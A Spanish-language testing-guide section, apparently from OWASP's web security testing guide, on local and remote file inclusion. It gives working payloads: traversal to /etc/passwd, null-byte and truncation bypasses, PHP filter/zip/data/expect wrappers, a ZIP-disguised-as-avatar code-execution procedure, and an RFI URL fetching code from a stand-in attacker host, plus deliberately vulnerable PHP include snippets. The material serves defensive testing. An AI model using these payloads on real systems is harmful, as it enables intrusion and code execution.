Inclusión de archivos

Resumen

La vulnerabilidad de inclusión de archivos (File Inclusion) permite a un atacante incluir un archivo, generalmente explotando un mecanismo de "inclusión dinámica de archivos" implementado en la aplicación objetivo. La vulnerabilidad se produce por el uso de entradas suministradas por el usuario sin la debida validación.

Esto puede conducir a algo tan simple como mostrar el contenido del archivo, pero también puede derivar en:

  • Ejecución de código en el servidor web
  • Ejecución de código del lado del cliente, como JavaScript, lo que puede conducir a otros ataques como Cross-Site Scripting (XSS)
  • Denegación de servicio (DoS)
  • Divulgación de información sensible

La inclusión de archivos locales (Local File Inclusion, LFI) es el proceso de incluir archivos que ya están presentes en el servidor mediante la explotación de procedimientos de inclusión vulnerables implementados en la aplicación. Por ejemplo, esta vulnerabilidad ocurre cuando una página recibe una entrada que es la ruta a un archivo local. Esta entrada no se sanea adecuadamente, lo que permite inyectar caracteres de recorrido de directorios (como ../ -- véase 4.5.1 Testing Directory Traversal File Include).

La inclusión de archivos remotos (Remote File Inclusion, RFI) es el proceso de incluir archivos desde fuentes remotas mediante la explotación de procedimientos de inclusión vulnerables implementados en la aplicación. Por ejemplo, esta vulnerabilidad ocurre cuando una página recibe una entrada que es la URL de un archivo remoto. Esta entrada no se sanea adecuadamente, lo que permite inyectar URL externas.

En ambos casos, aunque la mayoría de los ejemplos apuntan a scripts PHP vulnerables, debemos tener en cuenta que también es común en otras tecnologías como JSP, ASP, etc.

Objetivos de la prueba

  • Identificar los puntos de inclusión de archivos.
  • Evaluar la severidad o el impacto potencial de las vulnerabilidades.

Cómo probar

Inclusión de archivos locales

Dado que LFI ocurre cuando las rutas pasadas a las sentencias include no se sanean adecuadamente, en un enfoque de pruebas de caja negra se debe buscar funcionalidad que acepte nombres/rutas de archivos como parámetros.

Considérese el siguiente ejemplo:

https://vulnerable_host/preview.php?file=example.html

Parece un lugar prometedor para probar LFI. Si la aplicación no selecciona la página apropiada indicada en el parámetro file y en cambio incluye directamente la entrada, es posible incluir archivos arbitrarios del servidor.

Una prueba de concepto típica consiste en intentar cargar el archivo passwd con:

https://vulnerable_host/preview.php?file=../../../../etc/passwd

Si se cumplen las condiciones mencionadas, un atacante vería algo como lo siguiente incluido en la respuesta:

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...

Incluso cuando existe una vulnerabilidad así, su explotación podría ser más compleja en escenarios del mundo real. Considérese el siguiente fragmento de código:

<?php include($_GET['file'].".php"); ?>

Una simple sustitución por un nombre de archivo aleatorio no funcionaría, ya que el sufijo .php se añade a la entrada proporcionada. Para eludirlo, un evaluador puede utilizar varias técnicas para lograr la explotación esperada.

Inyección de byte nulo

El carácter nulo (también conocido como terminador nulo o byte nulo) es un carácter de control con valor cero presente en muchos conjuntos de caracteres que se utiliza como carácter reservado para marcar el final de una cadena. Una vez utilizado, cualquier carácter posterior a este byte especial será ignorado. Comúnmente, la forma de inyectar este carácter sería con la cadena codificada en URL %00, añadiéndola a la ruta solicitada. En nuestro ejemplo anterior, realizar una petición a https://vulnerable_host/preview.php?file=../../../../etc/passwd%00 haría que se ignorara la extensión .php que se añade al nombre de archivo de entrada, devolviendo al atacante una lista de usuarios básicos como resultado de una explotación exitosa.

Truncamiento de ruta y de puntos

La mayoría de las instalaciones de PHP tienen un límite de nombre de archivo de 4096 bytes. Si un nombre de archivo es más largo que esa longitud, PHP simplemente lo trunca, descartando los caracteres adicionales. Abusar de este comportamiento permite hacer que el motor de PHP ignore la extensión .php al desplazarla fuera del límite de 4096 bytes. Cuando esto sucede, no se genera ningún error; los caracteres adicionales simplemente se descartan y PHP continúa su ejecución normalmente.

Esta elusión se combinaría comúnmente con otras estrategias de elusión de la lógica, como codificar parte de la ruta del archivo con codificación Unicode, introducir doble codificación o cualquier otra entrada que siga representando el nombre de archivo válido deseado.

Wrappers de PHP

Las vulnerabilidades de inclusión de archivos locales suelen verse como vulnerabilidades de solo lectura que un atacante puede usar para leer datos sensibles del servidor que aloja la aplicación vulnerable. Sin embargo, en algunas implementaciones específicas esta vulnerabilidad puede usarse para escalar el ataque de LFI a vulnerabilidades de ejecución remota de código que podrían comprometer por completo el host.

Esta escalada es común cuando un atacante puede combinar la vulnerabilidad LFI con ciertos wrappers de PHP.

Un wrapper es un código que envuelve a otro código para realizar alguna funcionalidad adicional. PHP implementa muchos wrappers integrados para usarse con funciones del sistema de archivos. Una vez que se detecta su uso durante el proceso de pruebas de una aplicación, es una buena práctica intentar abusar de ellos para identificar el riesgo real de las debilidades detectadas. A continuación se presenta una lista con los wrappers más comúnmente utilizados, aunque se debe tener en cuenta que no es exhaustiva y que, al mismo tiempo, es posible registrar wrappers personalizados que, si el objetivo los emplea, requerirían un análisis ad hoc más profundo.

PHP Filter

Se utiliza para acceder al sistema de archivos local; es un wrapper que no distingue entre mayúsculas y minúsculas y que ofrece la capacidad de aplicar filtros a un flujo (stream) en el momento de abrir un archivo. Este wrapper puede usarse para obtener el contenido de un archivo evitando que el servidor lo ejecute. Por ejemplo, permite a un atacante leer el contenido de archivos PHP para obtener el código fuente e identificar información sensible, como credenciales u otras vulnerabilidades explotables.

El wrapper puede usarse como php://filter/convert.base64-encode/resource=FILE, donde FILE es el archivo que se desea recuperar. Como resultado de esta ejecución, el contenido del archivo objetivo se leería, se codificaría en base64 (este es el paso que evita la ejecución del lado del servidor) y se devolvería al User-Agent.

PHP ZIP

En PHP 7.2.0 se introdujo el wrapper zip:// para manipular archivos comprimidos zip. Este wrapper espera la siguiente estructura de parámetros: zip:///filename_path#internal_filename. El filename_path es la ruta al archivo ZIP malicioso y internal_filename es la ruta del archivo malicioso ubicado dentro del archivo ZIP procesado. Durante la explotación, es común que el # se codifique con su valor codificado en URL %23.

El abuso de este wrapper podría permitir a un atacante diseñar un archivo ZIP malicioso que pueda subirse al servidor, por ejemplo como imagen de avatar o usando cualquier sistema de carga de archivos disponible en el sitio objetivo (el wrapper php:zip:// no requiere que el archivo ZIP tenga una extensión específica), para ser ejecutado mediante la vulnerabilidad LFI.

Para probar esta vulnerabilidad, se podría seguir el siguiente procedimiento para atacar el ejemplo de código anterior.

  1. Crear el archivo PHP que se ejecutará, por ejemplo con el contenido <?php phpinfo(); ?>, y guardarlo como code.php.
  2. Comprimirlo en un nuevo archivo ZIP llamado target.zip.
  3. Renombrar el archivo target.zip a target.jpg para eludir la validación de extensión y subirlo al sitio web objetivo como imagen de avatar.
  4. Suponiendo que el archivo target.jpg se almacena localmente en el servidor en la ruta ../avatar/target.jpg, explotar la vulnerabilidad con el wrapper PHP ZIP inyectando el siguiente payload en la URL vulnerable: zip://../avatar/target.jpg%23code (recuerde que %23 corresponde a #).

Dado que en nuestro ejemplo la extensión .php se concatena a nuestro payload, la petición a https://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code resultará en la ejecución del archivo code.php existente dentro del archivo ZIP malicioso.

PHP Data

Disponible desde PHP 5.2.0, este wrapper espera el siguiente uso: data://text/plain;base64,BASE64_STR, donde se espera que BASE64_STR sea el contenido codificado en base64 del archivo a procesar. Es importante considerar que este wrapper solo estaría disponible si la opción allow_url_include está habilitada.

Para probar LFI usando este wrapper, el código a ejecutar debe estar codificado en base64. Por ejemplo, <?php phpinfo(); ?> se codificaría como: PD9waHAgcGhwaW5mbygpOyA/Pg== y el payload se representaría como: data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==.

PHP Expect

Este wrapper, que no está habilitado por defecto, proporciona acceso a los procesos stdio, stdout y stderr. Dado en el formato expect://command, el servidor ejecutaría el comando proporcionado usando BASH y devolvería el resultado.

Inclusión de archivos remotos

Dado que RFI ocurre cuando las URL pasadas a las sentencias include no se sanean adecuadamente, en un enfoque de pruebas de caja negra se debe buscar scripts que tomen nombres de archivo como parámetros. Considérese el siguiente ejemplo en PHP:

$incfile = $_REQUEST["file"];
include($incfile.".php");

En este ejemplo la ruta se extrae de la petición HTTP y no se realiza ninguna validación de entrada (por ejemplo, comparando la entrada con una lista de permitidos), por lo que este fragmento de código es vulnerable a este tipo de ataque. Considérese la siguiente URL:

https://vulnerable_host/vuln_page.php?file=https://attacker_site/malicous_page

En este caso el archivo remoto se va a incluir y cualquier código que contenga será ejecutado por el servidor.

Corrección

La solución más efectiva para eliminar las vulnerabilidades de inclusión de archivos es evitar pasar entradas enviadas por el usuario a cualquier API del sistema de archivos o del framework. Si esto no es posible, la aplicación puede mantener una lista de permitidos con los archivos que la página puede incluir y luego usar un identificador (por ejemplo, el número de índice) para acceder al archivo seleccionado. Cualquier petición que contenga un identificador no válido debe rechazarse para que los usuarios maliciosos no tengan oportunidad de manipular la ruta. Consulte la File Upload Cheat Sheet para conocer buenas prácticas de seguridad sobre este tema.
